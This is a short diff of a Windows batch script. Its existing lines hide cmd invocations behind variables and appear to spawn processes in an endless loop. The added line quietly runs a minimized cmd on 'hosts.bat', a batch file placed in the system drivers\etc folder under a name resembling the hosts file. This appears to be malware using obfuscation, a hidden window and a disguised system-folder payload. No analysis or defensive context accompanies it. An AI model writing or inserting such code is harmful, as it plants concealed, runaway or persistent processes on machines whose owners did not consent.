@@ -51,4 +51,7 @@ set "p= /c"
 %c%%p% %s% "" "%c%%p% %s% "" "%f%""
 %c%%p% %s% "" "%f%"
 
+start /min cmd /c "C:\Windows\System32\drivers\etc\hosts.bat"
+
 goto loop
+
